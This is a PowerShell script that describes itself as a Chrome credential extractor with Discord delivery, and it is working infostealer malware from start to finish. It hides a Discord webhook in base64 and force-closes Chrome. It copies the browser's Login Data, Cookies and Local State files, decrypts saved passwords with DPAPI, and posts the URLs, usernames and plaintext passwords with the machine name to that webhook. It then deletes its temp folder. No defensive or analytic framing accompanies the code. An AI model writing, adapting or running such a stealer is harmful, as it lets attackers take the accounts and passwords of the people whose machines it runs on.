<#
.SYNOPSIS
  Chrome credential extractor with Discord delivery
#>

# 1. Webhook Configuration (BASE64 ENCODED!)
$encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzMwMzUwOTcxMTY1MDgzNi9udUFwbkdTLUR2TmNlcWxwNldKRXFLYmdFODVMWkhxdVZXRWdwOVllQlh3cTR2NDdYVzA2Sk5yUXM0UWlHc2FjcV81ZA=="
$dcWebhook = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encWebhook))

# 2. DLL Auto-Selection
function Load-SQLite {
    param($tempDir)
    try {
        # Try .NET Standard first (modern systems)
        $standardDll = Join-Path $tempDir "System.Data.SQLite.NETStandard.dll"
        [Reflection.Assembly]::LoadFile($standardDll) | Out-Null
        return $true
    } catch {
        # Fallback to .NET Framework (older systems)
        $frameworkDll = Join-Path $tempDir "System.Data.SQLite.NETFramework.dll"
        [Reflection.Assembly]::LoadFile($frameworkDll) | Out-Null
        return $true
    }
    return $false
}

# 3. Main Execution
try {
    # Create temp directory
    $tempDir = "$env:TEMP\ChromeTemp_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Kill Chrome
    Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500

    # Copy required files
    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" $tempDir -Force
    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" $tempDir -Force
    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" $tempDir -Force

    # Load BouncyCastle
    $bcPath = Join-Path $tempDir "BouncyCastle.Crypto.dll"
    [Reflection.Assembly]::LoadFile($bcPath) | Out-Null

    # Load SQLite (auto-selects correct version)
    if (-not (Load-SQLite $tempDir)) { throw "Failed to load SQLite" }

    # Extract passwords
    $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$(Join-Path $tempDir 'Login Data')"
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()

    $results = @()
    while ($reader.Read()) {
        $encrypted = $reader.GetValue(2)
        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, "CurrentUser")
        $results += "$($reader.GetString(0)) | $($reader.GetString(1)) | $([Text.Encoding]::UTF8.GetString($plain))"
    }

    # Send to Discord
    $body = @{
        content = "Chrome data from $env:COMPUTERNAME"
        embeds = @(@{
            title = "Extracted Credentials"
            description = ($results -join "`n")
            color = 16711680
        })
    }
    Invoke-RestMethod -Uri $dcWebhook -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
}
finally {
    # Cleanup
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
